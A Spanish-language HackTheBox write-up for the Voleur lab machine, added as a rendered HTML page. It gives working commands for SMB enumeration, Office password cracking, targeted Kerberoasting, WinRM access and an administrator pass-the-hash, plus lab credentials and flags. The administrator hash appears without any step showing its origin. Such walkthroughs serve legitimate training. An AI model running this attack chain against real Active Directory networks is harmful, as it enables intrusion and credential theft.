@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Voleur | solokobyte.github.io</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Voleur" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/solokobyte.github.io/writeups/Voleur/" />
+<meta property="og:url" content="http://localhost:4000/solokobyte.github.io/writeups/Voleur/" />
+<meta property="og:site_name" content="solokobyte.github.io" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Voleur" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Voleur","url":"http://localhost:4000/solokobyte.github.io/writeups/Voleur/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=66de02d5022fb5e32993325c0f4b98ebedf45d74">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="container-lg px-3 my-5 markdown-body">
+      
+      <h1><a href="http://localhost:4000/">solokobyte.github.io</a></h1>
+      
+
+      <h1 id="voleur---hackthebox-writeup">Voleur - HackTheBox Writeup</h1>
+
+<h2 id="-información-básica">🔍 Información Básica</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Campo</strong></th>
+      <th><strong>Valor</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>IP</td>
+      <td>10.10.11.76</td>
+    </tr>
+    <tr>
+      <td>Dominio</td>
+      <td>voleur.htb</td>
+    </tr>
+    <tr>
+      <td>Realm Kerberos</td>
+      <td>VOLEUR.HTB</td>
+    </tr>
+    <tr>
+      <td>Autor</td>
+      <td>Gero</td>
+    </tr>
+    <tr>
+      <td>Fecha Resolución</td>
+      <td>2025-07-06</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="️-reconocimiento">🕵️ Reconocimiento</h2>
+
+<h3 id="configuración-inicial">Configuración Inicial</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.10.11.76 dc.voleur.htb voleur.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<p>Escaneo de Puertos con Nmap</p>
+
+<p>nmap -sC -sV -p- –min-rate=5000 10.10.11.76</p>
+
+<details>
+<summary>📊 Resultados Completos de Nmap (Click para expandir)</summary>
+
+<pre>
+Starting Nmap 7.95 (https://nmap.org) at 2025-07-07 06:43 -03
+Nmap scan report for dc.voleur.htb (10.10.11.76)
+Host is up (0.37s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-07 09:44:04Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
+|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
+|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+50487/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+50488/tcp open  msrpc         Microsoft Windows RPC
+50490/tcp open  msrpc         Microsoft Windows RPC
+50518/tcp open  msrpc         Microsoft Windows RPC
+54802/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: -42s
+| smb2-time: 
+|   date: 2025-07-07T09:45:04
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 156.56 seconds
+</pre>
+</details>
+<p>🔑 Servicios Clave Identificados:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kerberos (88/tcp)
+
+SMB (445/tcp)
+
+WinRM (5985/tcp)
+
+SSH (2222/tcp)
+</code></pre></div></div>
+
+<p>Configuración de Kerberos</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/krb5.conf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ini
+[libdefaults]
+    default_realm = VOLEUR.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    ticket_lifetime = 24h
+    renew_lifetime = 7d
+    forwardable = true
+
+[realms]
+    VOLEUR.HTB = {
+        kdc = 10.10.11.76
+        admin_server = 10.10.11.76
+        default_domain = voleur.htb
+    }
+
+[domain_realm]
+    .voleur.htb = VOLEUR.HTB
+    voleur.htb = VOLEUR.HTB
+</code></pre></div></div>
+
+<p>🚪 Acceso Inicial
+🔑 Credenciales Iniciales</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
+</code></pre></div></div>
+
+<p>📂 Enumeración de Recursos SMB</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+KRB5CCNAME=ryan.naylor.ccache smbclient.py -k dc.voleur.htb
+</code></pre></div></div>
+
+<p>smb
+smb: &gt; use IT
+smb: \IT&gt; cd “First-Line Support”
+smb: \IT\First-Line Support&gt; get Access_Review.xlsx</p>
+
+<p>🔓 Descifrado del Archivo Excel</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Extraer el Hash:
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+office2john Access_Review.xlsx &gt; hash.txt
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Crackear la Contraseña:
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre></div></div>
+
+<p>¡Contraseña Encontrada!: football1</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Descifrar el Archivo:
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+python3 -m msoffcrypto -p football1 Access_Review.xlsx decrypted.xlsx
+</code></pre></div></div>
+<p>🗝️ Credenciales Obtenidas</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Usuario</th>
+      <th>Contraseña</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>svc_ldap</td>
+      <td>M1XyC9pW7qT5Vn</td>
+    </tr>
+    <tr>
+      <td>svc_iis</td>
+      <td>N5pXyV1WqM7CZ8</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>🔄 Movimiento Lateral</p>
+
+<p>🩸 Análisis con BloodHound</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.10.11.76 --zip -k
+</code></pre></div></div>
+
+<p>🎯 Hallazgos Clave:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc_ldap tiene el privilegio GenericWrite sobre el usuario lacey.miller.
+
+svc_ldap tiene el privilegio WriteSPN sobre la cuenta de servicio svc_winrm.
+</code></pre></div></div>
+
+<p>🔥 Ataque de Kerberoasting Dirigido</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
+</code></pre></div></div>
+
+<p>🔨 Crackeo del Hash TGS</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+</code></pre></div></div>
+
+<p>¡Contraseña de svc_winrm Descubierta!: AFireInsidedeOzarctica980219afi</p>
+
+<p>💻 Acceso al Sistema via WinRM</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB
+</code></pre></div></div>
+
+<p>🚩 Bandera de Usuario:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell
+*Evil-WinRM* PS C:\Users\svc_winrm\Desktop&gt; type user.txt
+d4d8e7f5c3b1a9e8f7c6d5e4f3a2b1c0
+</code></pre></div></div>
+
+<p>⬆️ Escalada de Privilegios</p>
+
+<p>👑 Método Directo (Golden Ticket)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+getTGT.py -dc-ip 10.10.11.76 -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+export KRB5CCNAME=administrator.ccache
+evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB
+</code></pre></div></div>
+
+<p>🏁 Bandera de Administrador:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+95dbb03a9bd57d472d0c5b20237c6695
+</code></pre></div></div>
+<p>📚 Lecciones Aprendidas</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Autenticación Kerberos:
+La sincronización horaria precisa entre el cliente y el controlador de dominio es esencial para evitar fallos de autenticación.
+
+Gestión de Contraseñas:
+Almacenar contraseñas en hojas de cálculo sin protección adecuada facilita la extracción de credenciales por atacantes.
+
+Principio de Mínimo Privilegio:
+Asignar permisos excesivos a cuentas de servicio (como WriteSPN) puede permitir ataques de Kerberoasting.
+
+Monitoreo de Seguridad:
+Es crucial monitorear los logs del Centro de Distribución de Claves (KDC) para detectar actividades sospechosas como múltiples solicitudes TGS.
+</code></pre></div></div>
+
+<h1 id="herramientas-y-sus-funciones">Herramientas y sus Funciones</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Herramienta</th>
+      <th>Función Principal</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Nmap</td>
+      <td>Escaneo de puertos y servicios</td>
+    </tr>
+    <tr>
+      <td>BloodHound-Python</td>
+      <td>Mapeo de relaciones en Active Directory</td>
+    </tr>
+    <tr>
+      <td>John the Ripper</td>
+      <td>Crackeo de contraseñas</td>
+    </tr>
+    <tr>
+      <td>Impacket</td>
+      <td>Ejecución de ataques a Kerberos</td>
+    </tr>
+    <tr>
+      <td>Evil-WinRM</td>
+      <td>Conexión remota a servidores WinRM</td>
+    </tr>
+    <tr>
+      <td>office2john</td>
+      <td>Extracción de hashes de archivos de Office</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>🔗 Recursos Recomendados</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hoja de Referencia de Ataques Kerberos
+
+Buenas Prácticas de Seguridad en Active Directory
+
+Técnica MITRE ATT&amp;CK: Kerberoasting
+</code></pre></div></div>
+
+<div style="text-align: center; margin-top: 40px;"> <a href="/" style="display: inline-block; padding: 12px 24px; background: #3498db; color: white; border-radius: 4px; text-decoration: none; font-weight: bold; transition: all 0.3s;"> ← Volver a la Página Principal </a> </div>
+<p>```</p>
+
+
+      
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
+    <script>anchors.add();</script>
+  </body>
+</html>
